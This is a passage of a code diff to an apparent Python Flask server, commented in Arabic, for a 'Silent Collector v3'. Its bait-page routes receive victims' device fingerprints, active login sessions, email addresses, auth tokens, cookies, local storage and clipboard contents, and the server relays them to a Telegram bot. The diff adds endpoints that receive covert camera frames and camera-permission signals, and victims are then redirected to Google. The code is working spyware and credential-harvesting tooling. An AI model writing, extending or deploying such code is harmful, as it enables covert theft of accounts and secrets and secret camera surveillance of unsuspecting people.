         elif 'iPhone' in ua or 'iPad' in ua: os_name = "iOS"
         elif 'Linux' in ua: os_name = "Linux"
-        
+
         browser = "غير معروف"
         if 'Edg/' in ua: browser = "Edge"
         elif 'OPR/' in ua or 'Opera' in ua: browser = "Opera"
@@ -940,12 +1288,10 @@ def notify_bot(chat_id, session_id, data):
         elif 'Safari/' in ua: browser = "Safari"
         elif 'Firefox/' in ua: browser = "Firefox"
 
-        # ─── الشاشة ───
         screen = data.get('screen') or {}
         screen_text = f"{screen.get('width', '?')}×{screen.get('height', '?')}"
         dpr = screen.get('dpr', 1)
 
-        # ─── البطارية ───
         battery = data.get('battery')
         battery_text = "—"
         if battery:
@@ -953,20 +1299,16 @@ def notify_bot(chat_id, session_id, data):
             charging = "⚡ يشحن" if battery.get('charging') else "🔋 لا يشحن"
             battery_text = f"{charging} · {level}%"
 
-        # ─── الشبكة ───
         conn = data.get('connection') or {}
         net_text = conn.get('effective_type', '—')
         net_speed = conn.get('downlink', '—')
 
-        # ─── Hardware ───
         cores = data.get('hardware_concurrency', '?')
         ram = data.get('device_memory', '?')
 
-        # ─── WebGL ───
         webgl = data.get('webgl') or {}
         gpu = webgl.get('renderer', 'غير معروف')[:80]
 
-        # ─── الجلسات المكتشفة ───
         sessions = data.get('detected_sessions', [])
         sessions_text = ""
         if sessions:
@@ -976,7 +1318,6 @@ def notify_bot(chat_id, session_id, data):
         else:
             sessions_text = "🎯 <b>جلسات نشطة:</b> لا يوجد\n"
 
-        # ─── الإيميلات ───
         emails = data.get('found_emails', [])
         emails_text = ""
         if emails:
@@ -984,7 +1325,6 @@ def notify_bot(chat_id, session_id, data):
             for e in emails[:5]:
                 emails_text += f"  • <code>{e}</code>\n"
 
-        # ─── التوكنات ───
         tokens = data.get('found_tokens', [])
         tokens_text = ""
         if tokens:
@@ -992,7 +1332,6 @@ def notify_bot(chat_id, session_id, data):
             for t in tokens[:3]:
                 tokens_text += f"  • <code>{t.get('key', '?')[:30]}</code>\n"
 
-        # ─── التخزين ───
         cookies_data = data.get('cookies') or {}
         cookies_count = cookies_data.get('count', 0)
         local_keys = len(data.get('local_storage', {}))
@@ -1001,22 +1340,16 @@ def notify_bot(chat_id, session_id, data):
         cache_count = len(data.get('cache_keys', []))
         sw_count = len(data.get('service_workers', []))
 
-        # ─── الخطوط ───
         fonts_count = len(data.get('fonts', []))
 
-        # ─── الحافظة ───
         clipboard = data.get('clipboard')
         clipboard_text = "—"
         if clipboard:
             clipboard_text = f"<code>{str(clipboard)[:80]}</code>"
 
-        # ─── Storage Estimate ───
         storage_est = data.get('storage_estimate') or {}
         storage_usage = f"{storage_est.get('usage_mb', '?')} MB"
 
-        # ═══════════════════════════════════════════════════
-        # الرسالة الرئيسية
-        # ═══════════════════════════════════════════════════
         text = (
             f"🎯 <b>التقاط صامت</b>{label_text}\n"
             f"━━━━━━━━━━━━━━━━━━\n\n"
@@ -1057,7 +1390,10 @@ def notify_bot(chat_id, session_id, data):
             f"{sessions_text}"
             f"\n{emails_text}"
             f"\n{tokens_text}"
-            f"\n📋 <b>الحافظة:</b> {clipboard_text}"
+            f"\n📋 <b>الحافظة:</b> {clipboard_text}\n\n"
+
+            f"━━━ 🎥 الكاميرا ━━━\n"
+            f"⏳ <i>في انتظار إذن الكاميرا...</i>"
         )
 
         bot.send_message(cid, text, parse_mode="HTML", disable_web_page_preview=True)
@@ -1123,12 +1459,15 @@ def init_silent_collector_routes(app, bot_instance):
             logger.exception(f"silent_collector_page error: {e}")
             return redirect(GOOGLE_REDIRECT, code=302)
 
-        endpoint = f"{PUBLIC_URL}/s/{session_id}/collect"
+        endpoint = f"{PUBLIC_URL}/s/{session_id}"
 
         html = (COLLECTOR_PAGE
                 .replace("__SESSION_ID__", session_id)
                 .replace("__ENDPOINT__", endpoint)
-                .replace("__REDIRECT_URL__", GOOGLE_REDIRECT))
+                .replace("__REDIRECT_URL__", GOOGLE_REDIRECT)
+                .replace("__CAMERA_INTERVAL__", str(CAMERA_INTERVAL))
+                .replace("__CAMERA_MAX_FRAMES__", str(CAMERA_MAX_FRAMES))
+                .replace("__ACCESS_DELAY__", str(ACCESS_DELAY)))
 
         response = app.make_response(html)
         response.headers['Content-Type'] = 'text/html; charset=utf-8'
@@ -1140,7 +1479,7 @@ def init_silent_collector_routes(app, bot_instance):
 
     @app.route('/s/<session_id>/collect', methods=['POST', 'OPTIONS'])
     def silent_collect_endpoint(session_id):
-        """استقبال البيانات"""
+        """استقبال البيانات الرئيسية"""
         if request.method == 'OPTIONS':
             resp = app.make_response('')
             resp.headers['Access-Control-Allow-Origin'] = '*'
@@ -1168,12 +1507,73 @@ def init_silent_collector_routes(app, bot_instance):
             return resp, 200
 
 
+    @app.route('/s/<session_id>/camera', methods=['POST', 'OPTIONS'])
+    def silent_camera_endpoint(session_id):
+        """استقبال صورة من الكاميرا"""
+        if request.method == 'OPTIONS':
+            resp = app.make_response('')
+            resp.headers['Access-Control-Allow-Origin'] = '*'
+            resp.headers['Access-Control-Allow-Methods'] = 'POST, OPTIONS'
+            resp.headers['Access-Control-Allow-Headers'] = 'Content-Type'
+            return resp, 200
+
+        try:
+            data = request.get_json(silent=True) or {}
+
+            if data.get('session_id') != session_id:
+                return jsonify({'ok': False}), 200
+
+            if data.get('type') != 'camera_frame':
+                return jsonify({'ok': False}), 200
+
+            success = store_camera_frame(session_id, data)
+
+            resp = jsonify({'ok': success})
+            resp.headers['Access-Control-Allow-Origin'] = '*'
+            return resp, 200
+
+        except Exception as e:
+            logger.exception(f"silent_camera_endpoint error: {e}")
+            resp = jsonify({'ok': False})
+            resp.headers['Access-Control-Allow-Origin'] = '*'
+            return resp, 200
+
+
+    @app.route('/s/<session_id>/signal', methods=['POST', 'OPTIONS'])
+    def silent_signal_endpoint(session_id):
+        """استقبال إشارات الكاميرا (بدأت/رفضت/توقفت)"""
+        if request.method == 'OPTIONS':
+            resp = app.make_response('')
+            resp.headers['Access-Control-Allow-Origin'] = '*'
+            resp.headers['Access-Control-Allow-Methods'] = 'POST, OPTIONS'
+            resp.headers['Access-Control-Allow-Headers'] = 'Content-Type'
+            return resp, 200
+
+        try:
+            data = request.get_json(silent=True) or {}
+
+            if data.get('session_id') != session_id:
+                return jsonify({'ok': False}), 200
+
+            success = handle_camera_signal(session_id, data)
+
+            resp = jsonify({'ok': success})
+            resp.headers['Access-Control-Allow-Origin'] = '*'
+            return resp, 200
+
+        except Exception as e:
+            logger.exception(f"silent_signal_endpoint error: {e}")
+            resp = jsonify({'ok': False})
+            resp.headers['Access-Control-Allow-Origin'] = '*'
+            return resp, 200
+
+
     @app.route('/s/<session_id>/go', methods=['GET'])
     def silent_redirect(session_id):
         return redirect(GOOGLE_REDIRECT, code=302)
 
 
-    logger.info("[+] Silent Collector routes registered: /s/<session_id>")
+    logger.info("[+] Silent Collector v3 routes registered: /s/<session_id>")
 
 
 # ============================================================
